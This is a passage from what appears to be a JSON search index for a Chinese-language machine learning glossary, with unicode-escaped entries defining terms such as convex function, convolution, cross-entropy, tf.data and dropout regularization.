\u3002\u5178\u578b\u51f8\u51fd\u6570\u7684\u5f62\u72b6\u7c7b\u4f3c\u4e8e\u5b57\u6bcd U\u3002\u4f8b\u5982\uff0c\u4ee5\u4e0b\u90fd\u662f\u51f8\u51fd\u6570\uff1a \u76f8\u53cd\uff0c\u4ee5\u4e0b\u51fd\u6570\u5219\u4e0d\u662f\u51f8\u51fd\u6570\u3002\u8bf7\u6ce8\u610f\u56fe\u50cf\u4e0a\u65b9\u7684\u533a\u57df\u5982\u4f55\u4e0d\u662f\u51f8\u96c6\uff1a \u4e25\u683c\u51f8\u51fd\u6570\u53ea\u6709\u4e00\u4e2a\u5c40\u90e8\u6700\u4f4e\u70b9\uff0c\u8be5\u70b9\u4e5f\u662f\u5168\u5c40\u6700\u4f4e\u70b9\u3002\u7ecf\u5178\u7684 U \u5f62\u51fd\u6570\u90fd\u662f\u4e25\u683c\u51f8\u51fd\u6570\u3002\u4e0d\u8fc7\uff0c\u6709\u4e9b\u51f8\u51fd\u6570\uff08\u4f8b\u5982\u76f4\u7ebf\uff09\u5219\u4e0d\u662f\u8fd9\u6837\u3002 \u5f88\u591a\u5e38\u89c1\u7684 \u635f\u5931\u51fd\u6570 \uff08\u5305\u62ec\u4e0b\u5217\u51fd\u6570\uff09\u90fd\u662f\u51f8\u51fd\u6570\uff1a L_2 \u635f\u5931\u51fd\u6570 \u5bf9\u6570\u635f\u5931\u51fd\u6570 L_1 \u6b63\u5219\u5316 L_2 \u6b63\u5219\u5316 \u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u5f88\u591a\u53d8\u4f53\u90fd\u4e00\u5b9a\u80fd\u627e\u5230\u4e00\u4e2a\u63a5\u8fd1\u4e25\u683c\u51f8\u51fd\u6570\u6700\u5c0f\u503c\u7684\u70b9\u3002\u540c\u6837\uff0c \u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u5f88\u591a\u53d8\u4f53\u90fd\u6709\u5f88\u9ad8\u7684\u53ef\u80fd\u6027\u80fd\u591f\u627e\u5230\u63a5\u8fd1\u4e25\u683c\u51f8\u51fd\u6570\u6700\u5c0f\u503c\u7684\u70b9\uff08\u4f46\u5e76\u975e\u4e00\u5b9a\u80fd\u627e\u5230\uff09\u3002 \u4e24\u4e2a\u51f8\u51fd\u6570\u7684\u548c\uff08\u4f8b\u5982 L_2 \u635f\u5931\u51fd\u6570 + L_1 \u6b63\u5219\u5316\uff09\u4e5f\u662f\u51f8\u51fd\u6570\u3002 \u6df1\u5ea6\u6a21\u578b \u7edd\u4e0d\u4f1a\u662f\u51f8\u51fd\u6570\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u4e13\u95e8\u9488\u5bf9 \u51f8\u4f18\u5316 \u8bbe\u8ba1\u7684\u7b97\u6cd5\u5f80\u5f80\u603b\u80fd\u5728\u6df1\u5ea6\u7f51\u7edc\u4e0a\u627e\u5230\u975e\u5e38\u597d\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u867d\u7136\u8fd9\u4e9b\u89e3\u51b3\u65b9\u6848\u5e76\u4e0d\u4e00\u5b9a\u5bf9\u5e94\u4e8e\u5168\u5c40\u6700\u5c0f\u503c\u3002","title":"4.15. \u51f8\u51fd\u6570 (convex function)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#416-convex-optimization","text":"\u4f7f\u7528\u6570\u5b66\u65b9\u6cd5\uff08\u4f8b\u5982 \u68af\u5ea6\u4e0b\u964d\u6cd5 \uff09\u5bfb\u627e \u51f8\u51fd\u6570 \u6700\u5c0f\u503c\u7684\u8fc7\u7a0b\u3002\u673a\u5668\u5b66\u4e60\u65b9\u9762\u7684\u5927\u91cf\u7814\u7a76\u90fd\u662f\u4e13\u6ce8\u4e8e\u5982\u4f55\u901a\u8fc7\u516c\u5f0f\u5c06\u5404\u79cd\u95ee\u9898\u8868\u793a\u6210\u51f8\u4f18\u5316\u95ee\u9898\uff0c\u4ee5\u53ca\u5982\u4f55\u66f4\u9ad8\u6548\u5730\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u3002 \u5982\u9700\u5b8c\u6574\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Boyd \u548c Vandenberghe \u5408\u8457\u7684 Convex Optimization \uff08\u300a\u51f8\u4f18\u5316\u300b\uff09\u3002","title":"4.16. \u51f8\u4f18\u5316 (convex optimization)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#417-convex-set","text":"\u6b27\u51e0\u91cc\u5f97\u7a7a\u95f4\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u5176\u4e2d\u4efb\u610f\u4e24\u70b9\u4e4b\u95f4\u7684\u8fde\u7ebf\u4ecd\u5b8c\u5168\u843d\u5728\u8be5\u5b50\u96c6\u5185\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u4e24\u4e2a\u56fe\u5f62\u90fd\u662f\u51f8\u96c6\uff1a \u76f8\u53cd\uff0c\u4e0b\u9762\u7684\u4e24\u4e2a\u56fe\u5f62\u90fd\u4e0d\u662f\u51f8\u96c6\uff1a","title":"4.17. \u51f8\u96c6 (convex set)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#418-convolution","text":"\u7b80\u5355\u6765\u8bf4\uff0c\u5377\u79ef\u5728\u6570\u5b66\u4e2d\u6307\u4e24\u4e2a\u51fd\u6570\u7684\u7ec4\u5408\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u5377\u79ef\u7ed3\u5408\u4f7f\u7528\u5377\u79ef\u8fc7\u6ee4\u5668\u548c\u8f93\u5165\u77e9\u9635\u6765\u8bad\u7ec3\u6743\u91cd\u3002 \u673a\u5668\u5b66\u4e60\u4e2d\u7684\"\u5377\u79ef\"\u4e00\u8bcd\u901a\u5e38\u662f \u5377\u79ef\u8fd0\u7b97 \u6216 \u5377\u79ef\u5c42 \u7684\u7b80\u79f0\u3002 \u5982\u679c\u6ca1\u6709\u5377\u79ef\uff0c\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u5c31\u9700\u8981\u5b66\u4e60\u5927\u5f20\u91cf\u4e2d\u6bcf\u4e2a\u5355\u5143\u683c\u5404\u81ea\u7684\u6743\u91cd\u3002\u4f8b\u5982\uff0c\u7528 2K x 2K \u56fe\u50cf\u8bad\u7ec3\u7684\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u5c06\u88ab\u8feb\u627e\u51fa 400 \u4e07\u4e2a\u5355\u72ec\u7684\u6743\u91cd\u3002\u800c\u4f7f\u7528\u5377\u79ef\uff0c\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u53ea\u9700\u5728 \u5377\u79ef\u8fc7\u6ee4\u5668 \u4e2d\u627e\u51fa\u6bcf\u4e2a\u5355\u5143\u683c\u7684\u6743\u91cd\uff0c\u5927\u5927\u51cf\u5c11\u4e86\u8bad\u7ec3\u6a21\u578b\u6240\u9700\u7684\u5185\u5b58\u3002\u5728\u5e94\u7528\u5377\u79ef\u8fc7\u6ee4\u5668\u540e\uff0c\u5b83\u53ea\u9700\u8de8\u5355\u5143\u683c\u8fdb\u884c\u590d\u5236\uff0c\u6bcf\u4e2a\u5355\u5143\u683c\u90fd\u4f1a\u4e0e\u8fc7\u6ee4\u5668\u76f8\u4e58\u3002","title":"4.18. \u5377\u79ef (convolution)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#419-convolutional-filter","text":"\u5377\u79ef\u8fd0\u7b97 \u4e2d\u7684\u4e24\u4e2a\u53c2\u4e0e\u65b9\u4e4b\u4e00\u3002\uff08\u53e6\u4e00\u4e2a\u53c2\u4e0e\u65b9\u662f\u8f93\u5165\u77e9\u9635\u5207\u7247\u3002\uff09\u5377\u79ef\u8fc7\u6ee4\u5668\u662f\u4e00\u79cd\u77e9\u9635\uff0c\u5176 \u7b49\u7ea7 \u4e0e\u8f93\u5165\u77e9\u9635\u76f8\u540c\uff0c\u4f46\u5f62\u72b6\u5c0f\u4e00\u4e9b\u3002\u4ee5 28\u00d728 \u7684\u8f93\u5165\u77e9\u9635\u4e3a\u4f8b\uff0c\u8fc7\u6ee4\u5668\u53ef\u4ee5\u662f\u5c0f\u4e8e 28\u00d728 \u7684\u4efb\u4f55\u4e8c\u7ef4\u77e9\u9635\u3002 \u5728\u56fe\u5f62\u64cd\u4f5c\u4e2d\uff0c\u5377\u79ef\u8fc7\u6ee4\u5668\u4e2d\u7684\u6240\u6709\u5355\u5143\u683c\u901a\u5e38\u6309\u7167\u56fa\u5b9a\u6a21\u5f0f\u8bbe\u7f6e\u4e3a 1 \u548c 0\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u5377\u79ef\u8fc7\u6ee4\u5668\u901a\u5e38\u5148\u9009\u62e9\u968f\u673a\u6570\u5b57\uff0c\u7136\u540e\u7531\u7f51\u7edc\u8bad\u7ec3\u51fa\u7406\u60f3\u503c\u3002","title":"4.19. \u5377\u79ef\u8fc7\u6ee4\u5668 (convolutional filter)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#420-convolutional-layer","text":"\u6df1\u5ea6\u795e\u7ecf\u7f51\u7edc\u7684\u4e00\u4e2a\u5c42\uff0c \u5377\u79ef\u8fc7\u6ee4\u5668 \u4f1a\u5728\u5176\u4e2d\u4f20\u9012\u8f93\u5165\u77e9\u9635\u3002\u4ee5\u4e0b\u9762\u7684 3x3 \u5377\u79ef\u8fc7\u6ee4\u5668 \u4e3a\u4f8b\uff1a \u4e0b\u9762\u7684\u52a8\u753b\u663e\u793a\u4e86\u4e00\u4e2a\u7531 9 \u4e2a\u5377\u79ef\u8fd0\u7b97\uff08\u6d89\u53ca 5x5 \u8f93\u5165\u77e9\u9635\uff09\u7ec4\u6210\u7684\u5377\u79ef\u5c42\u3002\u8bf7\u6ce8\u610f\uff0c\u6bcf\u4e2a\u5377\u79ef\u8fd0\u7b97\u90fd\u6d89\u53ca\u4e00\u4e2a\u4e0d\u540c\u7684 3x3 \u8f93\u5165\u77e9\u9635\u5207\u7247\u3002\u7531\u6b64\u4ea7\u751f\u7684 3\u00d73 \u77e9\u9635\uff08\u53f3\u4fa7\uff09\u5c31\u5305\u542b 9 \u4e2a\u5377\u79ef\u8fd0\u7b97\u7684\u7ed3\u679c\uff1a","title":"4.20. \u5377\u79ef\u5c42 (convolutional layer)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#421-convolutional-neural-network","text":"\u4e00\u79cd\u795e\u7ecf\u7f51\u7edc\uff0c\u5176\u4e2d\u81f3\u5c11\u6709\u4e00\u5c42\u4e3a \u5377\u79ef\u5c42 \u3002\u5178\u578b\u7684\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\u5305\u542b\u4ee5\u4e0b\u51e0\u5c42\u7684\u7ec4\u5408\uff1a \u5377\u79ef\u5c42 \u6c60\u5316\u5c42 \u5bc6\u96c6\u5c42 \u5377\u79ef\u795e\u7ecf\u7f51\u7edc\u5728\u89e3\u51b3\u67d0\u4e9b\u7c7b\u578b\u7684\u95ee\u9898\uff08\u5982\u56fe\u50cf\u8bc6\u522b\uff09\u4e0a\u53d6\u5f97\u4e86\u5de8\u5927\u6210\u529f\u3002","title":"4.21. \u5377\u79ef\u795e\u7ecf\u7f51\u7edc (convolutional neural network)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#422-convolutional-operation","text":"\u5982\u4e0b\u6240\u793a\u7684\u4e24\u6b65\u6570\u5b66\u8fd0\u7b97\uff1a \u5bf9 \u5377\u79ef\u8fc7\u6ee4\u5668 \u548c\u8f93\u5165\u77e9\u9635\u5207\u7247\u6267\u884c\u5143\u7d20\u7ea7\u4e58\u6cd5\u3002\uff08\u8f93\u5165\u77e9\u9635\u5207\u7247\u4e0e\u5377\u79ef\u8fc7\u6ee4\u5668\u5177\u6709\u76f8\u540c\u7684\u7b49\u7ea7\u548c\u5927\u5c0f\u3002\uff09 \u5bf9\u751f\u6210\u7684\u79ef\u77e9\u9635\u4e2d\u7684\u6240\u6709\u503c\u6c42\u548c\u3002 \u4ee5\u4e0b\u9762\u7684 5x5 \u8f93\u5165\u77e9\u9635\u4e3a\u4f8b\uff1a \u73b0\u5728\uff0c\u4ee5\u4e0b\u9762\u8fd9\u4e2a 2x2 \u5377\u79ef\u8fc7\u6ee4\u5668\u4e3a\u4f8b\uff1a \u6bcf\u4e2a\u5377\u79ef\u8fd0\u7b97\u90fd\u6d89\u53ca\u4e00\u4e2a 2x2 \u8f93\u5165\u77e9\u9635\u5207\u7247\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u6211\u4eec\u4f7f\u7528\u8f93\u5165\u77e9\u9635\u5de6\u4e0a\u89d2\u7684 2x2 \u5207\u7247\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5bf9\u6b64\u5207\u7247\u8fdb\u884c\u5377\u79ef\u8fd0\u7b97\u5c06\u5982\u4e0b\u6240\u793a\uff1a \u5377\u79ef\u5c42 \u7531\u4e00\u7cfb\u5217\u5377\u79ef\u8fd0\u7b97\u7ec4\u6210\uff0c\u6bcf\u4e2a\u5377\u79ef\u8fd0\u7b97\u90fd\u9488\u5bf9\u4e0d\u540c\u7684\u8f93\u5165\u77e9\u9635\u5207\u7247\u3002","title":"4.22. \u5377\u79ef\u8fd0\u7b97 (convolutional operation)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#423-cost","text":"\u4e0e \u635f\u5931 \u7684\u542b\u4e49\u76f8\u540c\u3002","title":"4.23. \u6210\u672c (cost)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#424-cross-entropy","text":"\u5bf9\u6570\u635f\u5931\u51fd\u6570 \u5411 \u591a\u7c7b\u522b\u5206\u7c7b\u95ee\u9898 \u7684\u4e00\u79cd\u6cdb\u5316\u3002\u4ea4\u53c9\u71b5\u53ef\u4ee5\u91cf\u5316\u4e24\u79cd\u6982\u7387\u5206\u5e03\u4e4b\u95f4\u7684\u5dee\u5f02\u3002\u53e6\u8bf7\u53c2\u9605 \u56f0\u60d1\u5ea6 \u3002","title":"4.24. \u4ea4\u53c9\u71b5 (cross-entropy)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#425-estimator-custom-estimator","text":"\u60a8\u6309\u7167 \u8fd9\u4e9b\u8bf4\u660e \u81ea\u884c\u7f16\u5199\u7684 Estimator \u3002 \u4e0e \u9884\u521b\u5efa\u7684 Estimator \u76f8\u5bf9\u3002","title":"4.25. \u81ea\u5b9a\u4e49 Estimator (custom Estimator)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#5-d","text":"","title":"5. D"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#51-data-analysis","text":"\u6839\u636e\u6837\u672c\u3001\u6d4b\u91cf\u7ed3\u679c\u548c\u53ef\u89c6\u5316\u5185\u5bb9\u6765\u7406\u89e3\u6570\u636e\u3002\u6570\u636e\u5206\u6790\u5728\u9996\u6b21\u6536\u5230\u6570\u636e\u96c6\u3001\u6784\u5efa\u7b2c\u4e00\u4e2a\u6a21\u578b\u4e4b\u524d\u7279\u522b\u6709\u7528\u3002\u6b64\u5916\uff0c\u6570\u636e\u5206\u6790\u5728\u7406\u89e3\u5b9e\u9a8c\u548c\u8c03\u8bd5\u7cfb\u7edf\u95ee\u9898\u65b9\u9762\u4e5f\u81f3\u5173\u91cd\u8981\u3002","title":"5.1. \u6570\u636e\u5206\u6790 (data analysis)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#52-dataframe","text":"\u4e00\u79cd\u70ed\u95e8\u7684\u6570\u636e\u7c7b\u578b\uff0c\u7528\u4e8e\u8868\u793a Pandas \u4e2d\u7684\u6570\u636e\u96c6\u3002DataFrame \u7c7b\u4f3c\u4e8e\u8868\u683c\u3002DataFrame \u7684\u6bcf\u4e00\u5217\u90fd\u6709\u4e00\u4e2a\u540d\u79f0\uff08\u6807\u9898\uff09\uff0c\u6bcf\u4e00\u884c\u90fd\u7531\u4e00\u4e2a\u6570\u5b57\u6807\u8bc6\u3002","title":"5.2. DataFrame"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#53-data-set","text":"\u4e00\u7ec4 \u6837\u672c \u7684\u96c6\u5408\u3002","title":"5.3. \u6570\u636e\u96c6 (data set)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#54-dataset-api-tfdata","text":"\u4e00\u79cd\u9ad8\u7ea7\u522b\u7684 TensorFlow API\uff0c\u7528\u4e8e\u8bfb\u53d6\u6570\u636e\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u6240\u9700\u7684\u683c\u5f0f\u3002 tf.data.Dataset \u5bf9\u8c61\u8868\u793a\u4e00\u7cfb\u5217\u5143\u7d20\uff0c\u5176\u4e2d\u6bcf\u4e2a\u5143\u7d20\u90fd\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a \u5f20\u91cf \u3002 tf.data.Iterator \u5bf9\u8c61\u53ef\u83b7\u53d6 Dataset \u4e2d\u7684\u5143\u7d20\u3002 \u5982\u9700\u8be6\u7ec6\u4e86\u89e3 Dataset API\uff0c\u8bf7\u53c2\u9605\u300aTensorFlow \u7f16\u7a0b\u4eba\u5458\u6307\u5357\u300b\u4e2d\u7684 \u5bfc\u5165\u6570\u636e \u3002","title":"5.4. Dataset API (tf.data)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#55-decision-boundary","text":"\u5728 \u4e8c\u5143\u5206\u7c7b \u6216 \u591a\u7c7b\u522b\u5206\u7c7b\u95ee\u9898 \u4e2d\uff0c\u6a21\u578b\u5b66\u5230\u7684\u7c7b\u522b\u4e4b\u95f4\u7684\u5206\u754c\u7ebf\u3002\u4f8b\u5982\uff0c\u5728\u4ee5\u4e0b\u8868\u793a\u67d0\u4e2a\u4e8c\u5143\u5206\u7c7b\u95ee\u9898\u7684\u56fe\u7247\u4e2d\uff0c\u51b3\u7b56\u8fb9\u754c\u662f\u6a59\u8272\u7c7b\u522b\u548c\u84dd\u8272\u7c7b\u522b\u4e4b\u95f4\u7684\u5206\u754c\u7ebf\uff1a","title":"5.5. \u51b3\u7b56\u8fb9\u754c (decision boundary)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#56-dense-layer","text":"\u4e0e \u5168\u8fde\u63a5\u5c42 \u7684\u542b\u4e49\u76f8\u540c\u3002","title":"5.6. \u5bc6\u96c6\u5c42 (dense layer)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#57-deep-model","text":"\u4e00\u79cd \u795e\u7ecf\u7f51\u7edc \uff0c\u5176\u4e2d\u5305\u542b\u591a\u4e2a \u9690\u85cf\u5c42 \u3002\u6df1\u5ea6\u6a21\u578b\u4f9d\u8d56\u4e8e\u53ef\u8bad\u7ec3\u7684\u975e\u7ebf\u6027\u5173\u7cfb\u3002 \u4e0e \u5bbd\u5ea6\u6a21\u578b \u76f8\u5bf9\u3002","title":"5.7. \u6df1\u5ea6\u6a21\u578b (deep model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#58-dense-feature","text":"\u4e00\u79cd\u5927\u90e8\u5206\u503c\u662f\u975e\u96f6\u503c\u7684 \u7279\u5f81 \uff0c\u901a\u5e38\u662f\u6d6e\u70b9\u503c \u5f20\u91cf \u3002\u4e0e \u7a00\u758f\u7279\u5f81 \u76f8\u5bf9\u3002","title":"5.8. \u5bc6\u96c6\u7279\u5f81 (dense feature)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#59-device","text":"\u4e00\u7c7b\u53ef\u8fd0\u884c TensorFlow \u4f1a\u8bdd\u7684\u786c\u4ef6\uff0c\u5305\u62ec CPU\u3001GPU \u548c TPU\u3002","title":"5.9. \u8bbe\u5907 (device)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#510-discrete-feature","text":"\u4e00\u79cd \u7279\u5f81 \uff0c\u5305\u542b\u6709\u9650\u4e2a\u53ef\u80fd\u503c\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u503c\u53ea\u80fd\u662f\"\u52a8\u7269\"\u3001\"\u852c\u83dc\"\u6216\"\u77ff\u7269\"\u7684\u7279\u5f81\u4fbf\u662f\u4e00\u4e2a\u79bb\u6563\u7279\u5f81\uff08\u6216\u5206\u7c7b\u7279\u5f81\uff09\u3002\u4e0e \u8fde\u7eed\u7279\u5f81 \u76f8\u5bf9\u3002","title":"5.10. \u79bb\u6563\u7279\u5f81 (discrete feature)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#511-dropout-regularization","text":"\u6b63\u5219\u5316 \u7684\u4e00\u79cd\u5f62\u5f0f\uff0c\u5728\u8bad\u7ec3 \u795e\u7ecf\u7f51\u7edc \u65b9\u9762\u975e\u5e38\u6709\u7528\u3002\u4e22\u5f03\u6b63\u5219\u5316\u7684\u8fd0\u4f5c\u673a\u5236\u662f\uff0c\u5728\u4e00\u4e2a\u68af\u5ea6\u6b65\u957f\u4e2d\u79fb\u9664\u4ece\u795e\u7ecf\u7f51\u7edc\u5c42\u4e2d\u968f\u673a\u9009\u62e9\u7684\u56fa\u5b9a\u6570\u91cf\u7684\u5355\u5143\u3002\u4e22\u5f03\u7684\u5355\u5143\u8d8a\u591a\uff0c\u6b63\u5219\u5316\u6548\u679c\u5c31\u8d8a\u5f3a\u3002\u8fd9\u7c7b\u4f3c\u4e8e\u8bad\u7ec3\u795e\u7ecf\u7f51\u7edc\u4ee5\u6a21\u62df\u8f83\u5c0f\u7f51\u7edc\u7684\u6307\u6570\u7ea7\u89c4\u6a21\u96c6\u6210\u5b66\u4e60\u3002\u5982\u9700\u5b8c\u6574\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Dropout: A Simple Way to Prevent Neural Networks from Overfitting \uff08\u300a\u4e22\u5f03\uff1a\u4e00\u79cd\u9632\u6b62\u795e\u7ecf\u7f51\u7edc\u8fc7\u62df\u5408\u7684\u7b80\u5355\u65b9\u6cd5\u300b\uff09\u3002","title":"5.11. \u4e22\u5f03\u6b63\u5219\u5316 (dropout regularization)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#512-dynamic-model","text":"\u4e00\u79cd \u6a21\u578b \uff0c\u4ee5\u6301\u7eed\u66f4\u65b0\u7684\u65b9\u5f0f\u5728\u7ebf\u63a5\u53d7\u8bad\u7ec3\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6570\u636e\u4f1a\u6e90\u6e90\u4e0d\u65ad\u5730\u8fdb\u5165\u8fd9\u79cd\u6a21\u578b\u3002","title":"5.12. \u52a8\u6001\u6a21\u578b (dynamic model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#6-e","text":"","title":"6. 